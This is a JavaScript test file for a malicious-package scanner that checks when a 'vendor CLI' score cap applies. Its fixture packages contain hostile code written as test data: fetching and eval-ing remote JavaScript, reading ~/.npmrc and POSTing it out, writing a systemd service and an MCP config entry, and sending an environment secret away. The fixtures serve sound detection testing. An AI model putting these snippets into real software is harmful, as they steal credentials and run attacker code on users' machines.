// F10 vendor_cli_sdk contextual cap, end to end (mini-spec 2026-11-07).
//
// F10 caps at 35 a package that looks like a vendor CLI (bin + vendor identity) whose
// findings are credential noise without hard exfil. MT-1 already caps every package
// without an install hook at 35 unless a high-confidence type or a compound voids it,
// and F10 requires no install hook: F10 only changes the score after an MT-1 bypass.
// A test that only reads the score therefore proves nothing about F10. These tests
// run the real CLI with MUADDIB_DEBUG=1 and read the "[FP-CAP] ... vendor_cli_sdk→MAX35"
// line on stderr, plus the JSON score on stdout.
//
// They pin the current behavior, including the open questions of the mini-spec
// (non-hard high-confidence types are capped too). Changing F10 must change a test.

const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');
const { asyncTest, assert, BIN, cleanupTemp } = require('../test-utils');

const POS_CLI = `#!/usr/bin/env node
'use strict';
const key = process.env.PAYMENT_SECRET_KEY;
async function charge(amount) {
  const res = await fetch('https://api.paygrid-billing.io/v1/charges', {
    method: 'POST',
    headers: { authorization: 'Bearer ' + key, 'content-type': 'application/json' },
    body: JSON.stringify({ amount, key })
  });
  return res.json();
}
// Background session refresh, detached so the shell returns immediately.
require('child_process').spawn(process.execPath, [__filename, '--refresh-session'], { detached: true, stdio: 'ignore' }).unref();
charge(Number(process.argv[2] || 1)).then(r => console.log(r));
`;

const BASE_PKG = {
  name: '@acme-pay/cli',
  version: '1.0.0',
  description: 'Command line client for the Acme Pay API',
  main: 'bin/cli.js',
  bin: { 'acme-pay': 'bin/cli.js' },
  homepage: 'https://acme-pay.example'
};

function scanFixture(pkg, cliSource) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-f10-'));
  try {
    fs.mkdirSync(path.join(dir, 'bin'));
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(pkg, null, 2));
    fs.writeFileSync(path.join(dir, 'bin', 'cli.js'), cliSource);
    const r = spawnSync(process.execPath, [BIN, 'scan', dir, '--json'], {
      encoding: 'utf8',
      env: { ...process.env, MUADDIB_DEBUG: '1', MUADDIB_NO_REGISTRY_FETCH: '1' },
      maxBuffer: 1 << 26
    });
    const out = r.stdout || '';
    const json = JSON.parse(out.slice(out.indexOf('{')));
    const capLine = (r.stderr || '').split('\n').find(l => l.includes('[FP-CAP]')) || '';
    return {
      score: json.summary.riskScore,
      types: [...new Set((json.threats || []).map(t => t.type))].sort(),
      f10: capLine.includes('vendor_cli_sdk'),
      capLine
    };
  } finally {
    cleanupTemp(dir);
  }
}

const describe = s => `score=${s.score} f10=${s.f10} cap="${s.capLine.trim()}" types=${s.types.join(',')}`;

function assertCapped(s) {
  assert(s.f10, 'F10 expected to apply: ' + describe(s));
  assert(s.score === 35, 'score 35 expected: ' + describe(s));
}

function assertNotCapped(s) {
  assert(!s.f10, 'F10 must not apply: ' + describe(s));
  assert(s.score > 35, 'score above 35 expected (no cap may mask the veto): ' + describe(s));
}

async function runF10VendorCliE2ETests() {
  console.log('\n=== F10 VENDOR CLI SDK (END TO END) ===\n');

  await asyncTest('F10-E2E-POS: vendor CLI, env secret POSTed to its own API -> capped at 35 by F10', async () => {
    assertCapped(scanFixture(BASE_PKG, POS_CLI));
  });

  await asyncTest('F10-E2E-NEG-C1: no bin entry -> F10 does not apply', async () => {
    const { bin, ...pkg } = BASE_PKG; // eslint-disable-line no-unused-vars
    assertNotCapped(scanFixture(pkg, POS_CLI));
  });

  await asyncTest('F10-E2E-NEG-C2: no credential-noise finding -> F10 does not apply', async () => {
    const src = `#!/usr/bin/env node
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
fs.writeFileSync('/etc/systemd/system/acme-pay.service',
  '[Service]\\nExecStart=/usr/bin/node ' + __filename + '\\n[Install]\\nWantedBy=default.target\\n');
fs.writeFileSync('node_modules/acme-pay-hook/index.js', 'module.exports = require("' + __filename + '");');
`;
    assertNotCapped(scanFixture(BASE_PKG, src));
  });

  await asyncTest('F10-E2E-NEG-C3: mcp_config_injection -> F10 does not apply', async () => {
    const src = POS_CLI + `
const fs = require('fs');
const os = require('os');
fs.writeFileSync(os.homedir() + '/.cursor/mcp.json', '{"mcpServers":{"acme-pay":{"command":"node","args":["bin/cli.js"]}}}');
`;
    assertNotCapped(scanFixture(BASE_PKG, src));
  });

  await asyncTest('F10-E2E-NEG-C4: postinstall hook -> F10 does not apply', async () => {
    assertNotCapped(scanFixture({ ...BASE_PKG, scripts: { postinstall: 'node bin/cli.js --setup' } }, POS_CLI));
  });

  await asyncTest('F10-E2E-NEG-C5: hard exfil type (remote code load) -> F10 does not apply', async () => {
    const src = POS_CLI + `
fetch('https://cdn.paygrid-billing.io/hook.js').then(r => r.text()).then(code => eval(code));
`;
    assertNotCapped(scanFixture(BASE_PKG, src));
  });

  await asyncTest('F10-E2E-NEG-C6: credential file path in a finding (.npmrc) -> F10 does not apply', async () => {
    const src = POS_CLI + `
const npmrc = require('fs').readFileSync(require('os').homedir() + '/.npmrc', 'utf8');
fetch('https://api.paygrid-billing.io/v1/config', { method: 'POST', body: npmrc });
`;
    assertNotCapped(scanFixture(BASE_PKG, src));
  });

  await asyncTest('F10-E2E-NEG-C7: unscoped name and no homepage -> F10 does not apply', async () => {
    const { homepage, ...rest } = BASE_PKG; // eslint-disable-line no-unused-vars
    assertNotCapped(scanFixture({ ...rest, name: 'acme-pay-cli' }, POS_CLI));
  });
}

module.exports = { runF10VendorCliE2ETests };
